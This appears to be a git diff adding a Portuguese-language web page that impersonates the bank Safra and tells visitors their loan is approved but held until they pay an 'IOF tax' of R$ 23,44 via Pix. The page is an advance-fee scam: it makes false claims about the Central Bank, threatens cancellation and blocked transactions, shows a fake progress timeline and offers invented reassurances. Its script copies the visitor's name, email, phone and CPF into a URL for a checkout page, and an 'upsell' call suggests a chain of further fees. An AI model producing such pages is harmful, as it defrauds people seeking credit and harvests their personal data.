@@ -1,0 +1,951 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script src="../../js/utm.js"></script>
+<script src="../../js/tracking.js"></script>
+
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+  <meta charset="utf-8">
+  <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Pendência</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&amp;family=Plus+Jakarta+Sans:wght@500;600;700;800&amp;display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --green-accent: #020031;
+      --green-accent-dark: #0B0A52;
+      --green-accent-light: #DCFCE7;
+      --green-primary: #111827;
+      --green-dark: #1F2937;
+      --green-darker: #374151;
+      --white: #ffffff;
+      --gray-50: #f9fafb;
+      --gray-100: #f3f4f6;
+      --gray-200: #e5e7eb;
+      --gray-500: #6b7280;
+      --gray-700: #374151;
+      --gray-900: #111827;
+      --warning: #f59e0b;
+      --warning-light: #fef3c7;
+      --danger: #dc2626;
+      --danger-light: #fef2f2;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--gray-50);
+      color: var(--gray-900);
+      min-height: 100vh;
+      line-height: 1.6;
+    }
+
+    /* Header */
+    .header {
+      background: var(--white);
+      padding: 16px 20px;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 2px 10px rgba(2, 0, 49,0.08);
+      text-align: center;
+    }
+
+    .logo {
+      height: 40px;
+    }
+
+    /* Main Content */
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px 16px;
+    }
+
+    /* Page Title */
+    .page-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--green-primary);
+      margin-bottom: 12px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .page-title svg {
+      width: 28px;
+      height: 28px;
+      color: var(--green-accent);
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .page-desc {
+      font-size: 14px;
+      color: var(--gray-700);
+      margin-bottom: 20px;
+    }
+
+    /* Card */
+    .card {
+      background: var(--white);
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      padding: 24px 20px;
+      margin-bottom: 20px;
+    }
+
+    /* Alert Danger */
+    .alert-danger {
+      background: var(--danger-light);
+      border: 1px solid #fecaca;
+      border-left: 4px solid var(--danger);
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .alert-danger svg {
+      width: 24px;
+      height: 24px;
+      color: var(--danger);
+      flex-shrink: 0;
+    }
+
+    .alert-danger-content strong {
+      color: var(--danger);
+      display: block;
+      margin-bottom: 4px;
+      font-size: 14px;
+    }
+
+    .alert-danger-content span {
+      font-size: 13px;
+      color: var(--gray-700);
+    }
+
+    /* Section Title */
+    .section-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--green-primary);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .section-title svg {
+      width: 22px;
+      height: 22px;
+      color: var(--green-accent);
+    }
+
+    .section-subtitle {
+      font-size: 13px;
+      color: var(--gray-500);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .section-subtitle svg {
+      width: 16px;
+      height: 16px;
+    }
+
+    /* Video Container */
+    .video-container {
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 24px;
+      background: #000;
+      aspect-ratio: 16/9;
+    }
+
+    .video-container video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .video-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: opacity 0.35s ease;
+      z-index: 5;
+    }
+
+    .video-overlay.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .video-play-btn {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: rgba(2, 0, 49,0.92);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 6px 24px rgba(2, 0, 49,0.5);
+      transition: transform 0.2s ease;
+    }
+
+    .video-overlay:hover .video-play-btn {
+      transform: scale(1.08);
+    }
+
+    .video-play-btn svg {
+      width: 30px;
+      height: 30px;
+      color: #fff;
+      margin-left: 4px;
+    }
+
+    .video-play-pulse {
+      position: absolute;
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      border: 3px solid rgba(2, 0, 49,0.6);
+      animation: videoPulse 2s ease-out infinite;
+    }
+
+    @keyframes videoPulse {
+      0% { transform: scale(1); opacity: 1; }
+      100% { transform: scale(2.2); opacity: 0; }
+    }
+
+    /* Timeline */
+    .timeline {
+      position: relative;
+      padding: 10px 0;
+      margin-bottom: 20px;
+    }
+
+    .timeline-bar {
+      position: absolute;
+      left: 15px;
+      top: 30px;
+      bottom: 30px;
+      width: 3px;
+      background: var(--gray-200);
+      border-radius: 2px;
+    }
+
+    .timeline-item {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .timeline-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .timeline-dot {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: var(--gray-200);
+      border: 3px solid var(--white);
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      z-index: 1;
+      flex-shrink: 0;
+    }
+
+    .timeline-item.done .timeline-dot {
+      background: var(--green-accent);
+    }
+
+    .timeline-item.current .timeline-dot {
+      background: var(--warning);
+      animation: pulse 2s infinite;
+    }
+
+    .timeline-item.pending .timeline-dot {
+      background: var(--gray-200);
+    }
+
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4); }
+      50% { box-shadow: 0 0 0 10px rgba(245, 158, 11, 0); }
+    }
+
+    .timeline-body {
+      flex: 1;
+      margin-left: 16px;
+      padding: 14px 16px;
+      background: var(--white);
+      border-radius: 12px;
+      border: 1px solid var(--gray-200);
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .timeline-item.done .timeline-body {
+      background: var(--green-accent-light);
+      border-color: rgba(2, 0, 49,0.3);
+    }
+
+    .timeline-item.current .timeline-body {
+      background: var(--warning-light);
+      border-color: #fde68a;
+    }
+
+    .timeline-icon {
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .timeline-icon svg {
+      width: 24px;
+      height: 24px;
+      color: var(--green-accent);
+    }
+
+    .timeline-item.current .timeline-icon svg {
+      color: var(--warning);
+    }
+
+    .timeline-item.pending .timeline-icon svg {
+      color: var(--gray-500);
+    }
+
+    .timeline-text strong {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 14px;
+      color: var(--gray-900);
+      margin-bottom: 2px;
+    }
+
+    .timeline-text strong svg {
+      width: 16px;
+      height: 16px;
+      color: var(--green-accent);
+    }
+
+    .timeline-item.current .timeline-text strong svg {
+      color: var(--warning);
+    }
+
+    .timeline-text small {
+      font-size: 12px;
+      color: var(--gray-500);
+    }
+
+    /* Center Logo */
+    .center-logo {
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .center-logo img {
+      height: 36px;
+    }
+
+    .center-text {
+      font-size: 13px;
+      color: var(--gray-700);
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    /* PIX Card */
+    .pix-card {
+      background: var(--green-accent-light);
+      border: 2px solid rgba(2, 0, 49,0.4);
+      border-radius: 16px;
+      padding: 24px 20px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .pix-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--green-primary);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .pix-title svg {
+      width: 24px;
+      height: 24px;
+      color: var(--green-accent);
+    }
+
+    .pix-subtitle {
+      font-size: 13px;
+      color: var(--gray-500);
+      margin-bottom: 16px;
+    }
+
+    .pix-value {
+      font-size: 42px;
+      font-weight: 800;
+      color: var(--green-primary);
+      margin-bottom: 20px;
+    }
+
+    /* CTA Button */
+    .btn-cta {
+      width: 100%;
+      background: var(--green-accent);
+      color: var(--white);
+      border: none;
+      padding: 18px 24px;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-family: 'DM Sans', sans-serif;
+      box-shadow: 0 4px 15px rgba(2, 0, 49,0.3);
+      transition: all 0.2s ease;
+      margin-bottom: 16px;
+    }
+
+    .btn-cta:active {
+      transform: scale(0.98);
+      background: var(--green-accent-dark);
+    }
+
+    .btn-cta svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    /* Security Badge */
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 13px;
+      color: var(--gray-500);
+    }
+
+    .security-badge svg {
+      width: 18px;
+      height: 18px;
+      color: var(--green-accent);
+    }
+
+    /* FAQ */
+    .faq-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--green-primary);
+      text-align: center;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .faq-title svg {
+      width: 24px;
+      height: 24px;
+      color: #020031;
+    }
+
+    .faq-item {
+      border: 1px solid var(--gray-200);
+      border-radius: 12px;
+      margin-bottom: 12px;
+      overflow: hidden;
+    }
+
+    .faq-question {
+      width: 100%;
+      background: var(--white);
+      border: none;
+      padding: 16px;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--green-primary);
+      text-align: left;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    .faq-question svg {
+      width: 20px;
+      height: 20px;
+      color: #020031;
+      transition: transform 0.3s;
+      flex-shrink: 0;
+    }
+
+    .faq-question.active {
+      background: #F8F8F8;
+    }
+
+    .faq-question.active svg {
+      transform: rotate(180deg);
+    }
+
+    .faq-answer {
+      display: none;
+      padding: 0 16px 16px;
+      font-size: 13px;
+      color: var(--gray-700);
+      line-height: 1.6;
+    }
+
+    .faq-answer.show {
+      display: block;
+    }
+
+    /* Footer */
+    footer {
+      background: var(--green-primary);
+      padding: 32px 20px;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .footer-logo {
+      height: 40px;
+      margin-bottom: 16px;
+    }
+
+    .footer-info {
+      color: rgba(255,255,255,0.9);
+      font-size: 13px;
+      line-height: 1.8;
+    }
+
+    .footer-info strong {
+      color: var(--green-accent);
+    }
+  
+/* =================== FOOTER SAFRA =================== */
+.ss-footer{background:#fff;border-top:1px solid #E5E7EB;padding:32px 20px 24px;text-align:center;font-family:"DM Sans",-apple-system,BlinkMacSystemFont,sans-serif;color:#6B7280;font-size:14px;line-height:1.6}
+.ss-footer-logo{margin-bottom:16px}
+.ss-footer-logo img{height:28px;width:auto;display:inline-block}
+.ss-footer-company{font-size:14px;font-weight:700;color:#111827;margin-bottom:4px}
+.ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
+.ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
+.ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
+.ss-footer-links a:hover{color:#F97316}
+.ss-footer-links span{opacity:.4;font-size:12px}
+.ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
+.ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
+.ss-footer-badges svg{width:14px;height:14px;color:#020031}
+.ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+.ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
+.ss-dialog-head h2{font-family:"DM Sans",sans-serif;font-size:20px;font-weight:700;margin:0}
+.ss-dialog-close{background:none;border:none;font-size:32px;color:#6B7280;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:all .2s;line-height:1;padding:0}
+.ss-dialog-close:hover{background:#F3F4F6;color:#111827}
+.ss-dialog-body{padding:24px;overflow-y:auto;max-height:70vh}
+.ss-dialog-body h3{font-size:17px;font-weight:700;color:#111827;margin:24px 0 12px}
+.ss-dialog-body h3:first-child{margin-top:0}
+.ss-dialog-body p{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:16px}
+.ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
+.ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
+.ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
+.ss-contact-icon{width:48px;height:48px;background:#020031;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon svg{color:#fff;width:24px;height:24px}
+.ss-contact-item h4{font-size:15px;font-weight:700;color:#111827;margin:0 0 4px}
+.ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
+.ss-contact-note{margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px}
+.ss-contact-note p{font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px}
+.ss-contact-note p:last-child{margin-bottom:0}
+.ss-contact-note strong{color:#020031}
+
+</style>
+</head>
+
+<body>
+  <!-- Header -->
+  <header class="header">
+    <img src="../../images/logo.png?v=safra2" alt="Safra" class="logo">
+  </header>
+
+  <div class="container">
+    <!-- Page Title -->
+    <h1 class="page-title">
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+      </svg>
+      Parabéns, falta pouco para você receber o valor na sua conta!
+    </h1>
+    <p class="page-desc">
+      Você está a um passo de receber seu empréstimo. Efetue o pagamento do imposto IOF (Imposto sobre Operações Financeiras) emitido pelo Banco Central para autorizar o saque imediatamente para sua conta.
+    </p>
+
+    <!-- Main Card -->
+    <div class="card">
+      <!-- Alert -->
+      <div class="alert-danger">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+        </svg>
+        <div class="alert-danger-content">
+          <strong>AVISO IMPORTANTE</strong>
+          <span>O não pagamento do IOF resultará no cancelamento do empréstimo e no bloqueio de futuras transações bancárias.</span>
+        </div>
+      </div>
+
+      <!-- Video Section -->
+      <div class="section-title">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="color:#020031;">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        O que é IOF?
+      </div>
+      <div class="section-subtitle" style="cursor:pointer;" onclick="document.getElementById('customVideo').muted = false;">
+        Clique para ativar o som
+      </div>
+
+      <div class="video-container">
+        <video id="customVideo" muted="" playsinline="" autoplay="" loop="">
+          <source src="media/iTTuzcOs7ut4.mp4" type="video/mp4">
+        </video>
+        <div class="video-overlay" id="videoOverlay">
+          <span class="video-play-pulse"></span>
+          <div class="video-play-btn">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"></path></svg>
+          </div>
+        </div>
+      </div>
+
+      <!-- Timeline -->
+      <div class="timeline">
+        <div class="timeline-bar"></div>
+
+        <!-- Item 1 - Done -->
+        <div class="timeline-item done">
+          <div class="timeline-dot"></div>
+          <div class="timeline-body">
+            <div class="timeline-icon">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+              </svg>
+            </div>
+            <div class="timeline-text">
+              <strong>
+                Simulação
+              </strong>
+              <small>Simulação realizada e cadastro concluído</small>
+            </div>
+          </div>
+        </div>
+
+        <!-- Item 2 - Done -->
+        <div class="timeline-item done">
+          <div class="timeline-dot"></div>
+          <div class="timeline-body">
+            <div class="timeline-icon">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+              </svg>
+            </div>
+            <div class="timeline-text">
+              <strong>
+                Pagamento do Seguro
+              </strong>
+              <small>Pagamento concluído com sucesso</small>
+            </div>
+          </div>
+        </div>
+
+        <!-- Item 3 - Current -->
+        <div class="timeline-item current">
+          <div class="timeline-dot"></div>
+          <div class="timeline-body">
+            <div class="timeline-icon">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+              </svg>
+            </div>
+            <div class="timeline-text">
+              <strong>
+                Pagamento do Imposto IOF
+              </strong>
+              <small>Aguardando pagamento para liberação do crédito</small>
+            </div>
+          </div>
+        </div>
+
+        <!-- Item 4 - Pending -->
+        <div class="timeline-item pending">
+          <div class="timeline-dot"></div>
+          <div class="timeline-body">
+            <div class="timeline-icon">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+              </svg>
+            </div>
+            <div class="timeline-text">
+              <strong>Crédito na conta</strong>
+              <small>Crédito enviado para sua conta bancária</small>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Center Logo -->
+      <div class="center-logo">
+      </div>
+      <p class="center-text">
+        O não pagamento do imposto resulta no cancelamento do contrato do empréstimo, impossibilitando uma nova contratação por um prazo máximo de 90 dias.
+      </p>
+    </div>
+
+    <!-- PIX Card -->
+    <div class="pix-card" style="background:#F8F8F8;border-color:rgba(2, 0, 49,0.4);">
+      <div class="pix-title">
+        <svg viewBox="0 0 24 24" fill="currentColor" style="color:#020031;">
+          <path d="m15.45 16.52l-3.01-3.01c-.11-.11-.24-.13-.31-.13s-.2.02-.31.13L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.08.08.2.13.31.13s.23-.05.31-.13l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"></path>
+          <path d="m21.11 9.85l-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.28.28-.65.42-1.02.42a1.5 1.5 0 0 1-1.02-.42L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.28-.28.65-.42 1.02-.42s.74.14 1.02.42l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"></path>
+        </svg>
+        Pague via Pix
+      </div>
+      <p class="pix-subtitle">O pagamento será confirmado imediatamente</p>
+      <div class="pix-value">R$ 23,44</div>
+
+      <button onclick="redirect()" class="btn-cta" style="background:#020031;box-shadow:0 4px 15px rgba(2, 0, 49,0.3);">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+        Pagar agora
+      </button>
+
+      <div class="security-badge">
+        <svg fill="currentColor" viewBox="0 0 20 20" style="color:#020031;">
+          <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+        </svg>
+        Ambiente seguro
+      </div>
+    </div>
+
+    <!-- FAQ -->
+    <div class="card">
+      <div class="faq-title">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        Dúvidas Frequentes
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question active" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          Por que o imposto IOF não é descontado do empréstimo?
+        </button>
+        <div class="faq-answer show">
+          O valor do Imposto IOF é tratado separadamente pois ele é um imposto emitido pelo Banco Central assim que um empréstimo é aprovado, e é destinado aos cofres públicos, para garantir segurança para ambas as partes.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          O que acontece após pagar o imposto?
+        </button>
+        <div class="faq-answer">
+          Você será redirecionado automaticamente para a página onde confirmará e autorizará a transferência do dinheiro para sua conta.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          Quanto tempo demora para liberar o crédito?
+        </button>
+        <div class="faq-answer">
+          Como o pagamento é feito via Pix, a liberação do empréstimo é imediata. Todo o processo, incluindo a transferência do crédito, leva cerca de 5-10 minutos.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          É seguro fazer o pagamento?
+        </button>
+        <div class="faq-answer">
+          <strong>Safra</strong> atua há mais de <strong>14 anos</strong> com empréstimos online, contando com milhares de clientes satisfeitos. Nosso site é seguro e confiável. Não solicitamos sua senha ou dados bancários sensíveis.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          O que acontece se eu não pagar o imposto?
+        </button>
+        <div class="faq-answer">
+          Se você não pagar o imposto, seu pedido de empréstimo será cancelado, mas lembre-se de que o imposto IOF é obrigatório pelo Banco Central, para garantir a segurança e processamento do seu pedido.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+
+  <script>
+    // Carregar dados do usuário
+
+    // Redirect
+    function buildCheckoutParams() {
+      const g = (...ks) => { for (const k of ks) { try { const v = localStorage.getItem(k); if (v && v.trim()) return v.trim(); } catch (e) {} } return ""; };
+      // Preserva TODAS as UTMs/parâmetros já presentes na URL (utm_*, src, sck, fbclid, gclid, xcod, etc.)
+      const p = new URLSearchParams(window.location.search);
+      ["offer","pix_total","seguro_price","bump1","amount","cotacao_index"].forEach(function(k){ p.delete(k); });
+      const setIfMissing = (k, v) => { if (v && !p.get(k)) p.set(k, v); };
+      setIfMissing("name", g("name", "nome", "nomeUsuario"));
+      setIfMissing("email", g("email"));
+      setIfMissing("telephone", g("telephone", "telefone"));
+      setIfMissing("document", g("document", "cpf", "cpfUsuario"));
+      return p.toString();
+    }
+
+    function redirect() {
+      window.location.href = '../../pagamento/?offer=up4&' + buildCheckoutParams();
+    }
+
+    // Toggle FAQ
+    function toggleFaq(button) {
+      const answer = button.nextElementSibling;
+      const isActive = button.classList.contains('active');
+      
+      // Close all
+      document.querySelectorAll('.faq-question').forEach(q => q.classList.remove('active'));
+      document.querySelectorAll('.faq-answer').forEach(a => a.classList.remove('show'));
+      
+      // Open clicked if it was closed
+      if (!isActive) {
+        button.classList.add('active');
+        answer.classList.add('show');
+      }
+    }
+
+    // Video Player - botão de play central
+    const video = document.getElementById('customVideo');
+    const videoOverlay = document.getElementById('videoOverlay');
+    if (video && videoOverlay) {
+      videoOverlay.addEventListener('click', () => {
+        video.muted = false;
+        video.currentTime = 0;
+        const p = video.play();
+        if (p && p.catch) p.catch(() => {});
+        videoOverlay.classList.add('hidden');
+      });
+    }
+
+    // Inicializar
+    
+  </script>
+  <script src="js/4Ad49hAWonop.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+    initUpsell(4);
+    });
+    </script>
+<!-- FOOTER SAFRA -->
+<footer class="ss-footer">
+  <div class="ss-footer-logo"><img src="../../images/logo.png?v=safra2" alt="Safra"></div>
+  <p class="ss-footer-company">&copy; 2025 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
+  <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
+  <div class="ss-footer-links">
+    <a onclick="document.getElementById('ss-termos').showModal();return false;">Termos de Uso</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-privacidade').showModal();return false;">Política de Privacidade</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-contato').showModal();return false;">Contato</a>
+  </div>
+  <div class="ss-footer-badges">
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>SSL Seguro</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>Dados protegidos</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>Instituição regulada</span>
+  </div>
+</footer>
+
+<dialog id="ss-termos" class="ss-dialog">
